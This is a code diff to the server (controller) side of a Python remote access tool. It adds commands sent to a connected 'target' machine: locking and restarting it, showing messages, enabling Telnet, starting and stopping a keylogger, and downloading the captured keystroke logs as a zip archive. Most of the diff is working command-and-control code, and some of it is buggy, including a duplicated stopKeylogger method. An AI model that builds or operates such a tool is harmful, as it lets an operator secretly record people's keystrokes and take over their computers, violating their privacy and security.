@@ -23,7 +23,9 @@ import time
 import random
 import string
 
+
 class Server:
+# '''SOCKET SET UP STARTS HERE'''
     def __init__(self, ip, port, buffer_size):
         self.IP = ip
         self.PORT = port
@@ -93,6 +95,20 @@ class Server:
         if response == "MISMATCH":
             self.close()
 
+    def closeConnection(self):
+        self.connections.remove(self.client_socket)
+        self.client_socket.close()
+        self.server.close()
+
+    def disconnectTarget(self):
+        command = "--esc"
+
+        self.client_socket.send(command.encode("utf-8"))
+        print("*** Killed")
+# ''' SOCKET SET UP ENDS HERE '''
+
+# ''' COMMAND FUNCTIONS START HERE'''
+    '''WINDOWS FUNCTIONS'''
     def sendMsg(self):
         command = "-Msg"
         self.client_socket.send(command.encode())
@@ -115,10 +131,27 @@ class Server:
     def locksystem(self):
         command = "-lock"
         self.client_socket.send(command.encode("utf-8"))
-
         response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         print(response)
 
+    def restartsystem(self):
+        command = "-restart"
+        self.client_socket.send(command.encode("utf-8"))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(response)
+
+    ## TODO: CHECK THIS
+    def systemmsg(self):
+        command = "-Msg"
+        self.client_socket.send(command.encode())
+        msg = input("[+] Enter message: ")
+        time.sleep(2)
+        self.client_socket.send(msg.encode())
+        print(msg)
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        print(results)
+
+# '''TELNET FUNCTIONS'''
     def playstarwars(self):
         command = "-EpIV"
         self.client_socket.send(command.encode("utf-8"))
@@ -138,6 +171,60 @@ class Server:
         command = "-Chess"
         self.client_socket.send(command.encode("utf-8"))
         print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")
+
+# ''' KEYLOGGER FUNCTIONS '''
+    def startKeyLogger(self):
+        pass
+    def stopKeylogger(self):
+        command = "-start"
+        self.client_socket.send(command.encode("utf-8"))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(response)
+
+    def stopKeylogger(self):
+        command = "-stop"
+        self.client_socket.send(command.encode("utf-8"))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(response)
+
+    def retrievelogs(self):
+
+    # """ Receiving the keylogger files """
+        command = "--getlogs"
+        self.client_socket.send(command.encode("utf-8"))
+
+        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if flag == "[OK]":
+            # recv size
+            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+            time.sleep(0.1)
+
+            if int(size) <= self.BUFFER_SIZE:
+                # recv archive
+                archive = self.client_socket.recv(self.BUFFER_SIZE)
+                print("*** Got logs ***")
+
+                with open('../receivedfile/keylogs.zip', 'wb+') as output:
+                    output.write(archive)
+
+                print("*** Logs saved ***")
+
+            else:
+                # update buffer
+                buff = self.updateBuffer(size)
+
+                # recv archive
+                fullarchive = self.saveBigFile(int(size), buff)
+
+                print("*** Got logs ***")
+                with open('../receivedfile/keylogs.zip', 'wb+') as output:
+                    output.write(fullarchive)
+
+                print("*** Logs saved ***")
+        else:
+            print("[!] FATAL: Logs do not exist!")
+
+# ''' SCREENSHOT FUNCTIONS '''
 
 ## TODO: Update
     def filesend(self):
@@ -174,11 +261,37 @@ class Server:
 
                 print("*** File saved ***")
                 self.recvcounter += 1
+                # recv size
+                size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+                time.sleep(0.1)
+                if int(size) <= self.BUFFER_SIZE:
+                    # recv archive
+                    archive = self.client_socket.recv(self.BUFFER_SIZE)
+                    print("*** Got file ***")
+
+                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
+                        output.write(archive)
+
+                    print("*** File saved ***")
+                    self.recvcounter += 1
+                else:
+                    # update buffer
+                    buff = self.updateBuffer(size)
+
+                    # recv archive
+                    fullarchive = self.saveBigFile(int(size), buff)
+
+                    print("*** Got file *** ")
+                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
+                        output.write(fullarchive)
+
+                    print("*** File saved ***")
+                    self.recvcounter += 1
         else:
             print(response.decode("utf-8"))
-
-
-## TODO
+    def filereceive(self):
+        pass
+## TODO: message
     def shutdownmessage(self):
         command = "-shutdownM"
         self.client_socket.send(command.encode("utf-8"))
